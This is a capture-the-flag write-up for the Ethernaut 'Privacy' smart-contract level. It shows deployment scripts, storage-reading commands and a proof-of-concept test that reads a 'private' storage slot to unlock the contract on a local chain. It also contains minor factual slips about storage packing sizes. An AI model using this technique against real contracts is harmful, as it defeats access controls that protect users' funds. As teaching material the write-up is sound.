# Ethernaut Level 12 - Privacy

You can also read this
[on my blog](https://wizzardhat.com/ethernaut-level-12-privacy/) üòé

## Objectives

- Unlock the contract!

Set the `bool public locked` to the value of `false`.

## Contract Overview

From my initial reconnaissance, it seems that `Privacy` level 12 is very similar
to [level 8 - Vault](https://wizzardhat.com/ethernaut-level-8-vault/). It is
about the storage structure and accessing certain slots to solve the challenge.

To understand the contract a little bit better I wanted to interact with it
using `cast` commands. I started working on a shell script to deploy the game
locally to `anvil`'s local blockchain. Halfway through I remembered that there
is something like "Solidity scripting" in Foundry. I decided to give it a go...

I am amazed.

Working on deployment in bash was a little bit complicated. If you are
interested in that you can check it out
[here](https://github.com/ChmielewskiKamil/ethernaut-foundry/tree/main/src/levels/12-Privacy/game_deploy_anvil.sh).
Solidity scripting is a much more pleasant experience. I've come up with the
following script
([full version here](https://github.com/ChmielewskiKamil/ethernaut-foundry/tree/main/script/Privacy.s.sol)):

```solidity
// snipp ...
contract Deployment is Script, Test {

	function run() external {
		uint256 deployerPrivateKey = vm.envUint("ANVIL_PRIVATE_KEY");

		vm.startBroadcast(deployerPrivateKey);

		// GAME INSTANCE SETUP //
		Ethernaut ethernaut = new Ethernaut();

		// LEVEL INSTANCE SETUP //
		PrivacyFactory privacyFactory = new PrivacyFactory();
		ethernaut.registerLevel(privacyFactory);

		address levelAddress = ethernaut.createLevelInstance(privacyFactory);
		Privacy privacyContract = Privacy(levelAddress);

		emit log_named_address("Level address: ", levelAddress);
		vm.stopBroadcast();
	}
}
```

This is a very basic deployment script. If you have read any of my previous
write-ups, you will immediately see that it is structured the same way as the
test setup. This is the beauty of writing everything in Solidity.

If you look closely you will see that I have imported the testing library -
`Test.sol`. We need it to log the level address for us to interact with. It is
also possible to avoid this step and check the address in the transaction
receipt in the `broadcast` folder which is auto-generated by the Foundry.

Spin up your local anvil chain, run the script and we are ready to go. We can
check what is inside the `Privacy` contract storage slots with the
`cast storage` command.

As a side note: To run the script use the following command:

```shell
$ forge script script/Privacy.s.sol:Deployment --fork-url http://localhost:8545 --broadcast
```

Also, remember to have the Anvil private key set up in the `.env` file.

```shell
ANVIL_PRIVATE_KEY=0x123...
```

## Finding the weak spots

The `Privacy` contract shares the same weakness as the Level 8 - `Vault`
contract. Nothing on the blockchain is private. It is relatively easy to access
data inside the contract's storage and `unlock` the contract.

This time it is a bit harder. It is necessary to understand how different types
of variables are placed in the storage.

The `data` that we are interested in is a `bytes32` statically-sized array. Such
a data type follows three rules. Let's look at the
[Secureum Solidity 201](https://secureum.substack.com/p/solidity-201) point 102:

> 102.  Storage Layout & Structs/Arrays:

    1.  Structs and array data always start a new slot and their items are packed tightly according to these rules
    2.  Items following struct or array data always start a new storage slot
    3.  The elements of structs and arrays are stored after each other, just as if they were given as individual values.

According to these rules and also the basic storage layout packing rules
described in [Level 8 - Vault](https://wizzardhat.com/ethernaut-level-8-vault/)
array elements should be laid out one after another (just after other
variables). This will happen because they are 32 bytes each, which is equal to
the size of the EVM storage slot.

Before we check this behaviour let's think about the storage structure. Let's
test our knowledge.

| slot number | What's inside?       |
| ----------- | -------------------- |
| 0           | bool                 |
| 1           | uint256              |
| 2           | uint8, uint8, uint16 |
| 3           | bytes32[1]           |
| 4           | bytes32[2]           |
| 5           | bytes32[3]           |

The boolean value takes 1 byte of storage space, so it won't fit into one
storage slot with the `uint256`, which takes 32 bytes. The two `uint8`s will fit
into one slot with the `uint16` because they take a total of 32 bytes.

When it comes to the `bytes32[]` array, it will take 3 slots. The storage needs
to be initialized and the compiler reserves three 32-byte slots for the array
elements.

We are interested in the 4th slot. Let's look inside...

```shell
# Replace the level address appropriately
cast storage 0xf3dfb0a70010735b0a14b4a69afc242b19600049 4

# this is the output:
# 0x1901a68623ddbd9027f019787f566e173db7b8be985ec7b87314284665a45717
```

To unlock the contract we need to downcast this `bytes32` output to `bytes16`. I
couldn't find any `cast` conversion command to do that. Let's see if we can pass
this output as an argument to the `unlock()` function without downcasting it
ahead of time.

```shell
# --from one of the anvil available accounts
cast send 0xf3dfb0a70010735b0a14b4a69afc242b19600049 "unlock(bytes16)" "0x1901a68623ddbd9027f019787f566e173db7b8be985ec7b87314284665a45717" --from 0x90f79bf6eb2c4f870365e785982e1f101e93b906
```

After running this command I get the following error: Failed to parse tokens. I
am not sure whether it is the problem with the wrong argument type. I will use
an online converter to get bytes16 and try again...

It turns out there are no such converters...

We could write another script and solve the problem this way. There is no point
in doing that because writing a PoC unit test will be much simpler and we got to
do it anyway.

By now we have achieved the most important thing. We know that it is possible to
access the second element of the `bytes32` array. It was the hardest part. We
should figure out the rest without any problem.

## Potential attack scenario - hypothesis

_Eve is our attacker_

Eve can unlock the `Privacy` contract by accessing the second element of the
`bytes32 data` array. She will downcast it to the `bytes16` type and call the
`unlock()`.

## Plan of the attack

1. Eve will access the 4th storage slot via RPC (`vm.load`)
2. She will downcast it to the `bytes16` type
3. She will pass the result of downcasting as an argument to the `unlock()`
   function
4. Contract will be unlocked

## Proof of Concept - hypothesis test ‚ùå

It turns out that I have missed something really obvious. Maybe you have caught
the flaw in my logic much sooner. **We are not interested in the second
element** of the `bytes32` array! Array elements are indexed from `0`, so the
`bytes16[2]` is the third element.

The new hypothesis will look like this ‚ôªÔ∏è:

Eve can unlock the `Privacy` contract by accessing **the third element** of the
`bytes32` data array. She will downcast it to the `bytes16` type and call the
`unlock()`.

This hypothesis has been proven to be true.

Here is a simplified version of the unit test showcasing the issue
([full version here](https://github.com/ChmielewskiKamil/ethernaut-foundry/blob/main/test/12-Privacy.t.sol)):

```solidity
// snippet...
bytes32 thirdElement = vm.load(
	address(privacyContract),
	bytes32(uint256(5))
);

bytes16 downcastedThirdElement = bytes16(thirdElement);

privacyContract.unlock(downcastedThirdElement);
// snippet...
```

It is possible to simplify the code. Eve can perform downcasting directly inside
the `unlock` function invocation. It would look like this:

```solidity
// this is redundant now
// bytes16 downcastedThirdElement = bytes16(thirdElement);

privacyContract.unlock(bytes16(thirdElement));
```

Here are the logs from the exploit:

![Level 12 exploit logs.](https://github.com/ChmielewskiKamil/ethernaut-foundry/blob/main/img/12-exploit-logs.png?raw=true)

Please note that when downcasting bytes from a larger type to the smaller one,
the lower-order bits are dropped. Foundry uses the `bytes32` type for log
string, so the padding is added. It is not present in the actual value used to
unlock the contract.

## Recommendations

- Nothing is private on the public blockchain. Sensitive information like
  passwords or keys should not be stored in a place where anyone can read them.
- Obfuscate the data or don't store it on the public ledger at all.

## References

- [Secureum Solidity 201](https://secureum.substack.com/p/solidity-201)
- You can also read this
  [on my blog](https://wizzardhat.com/ethernaut-level-12-privacy/) üòé
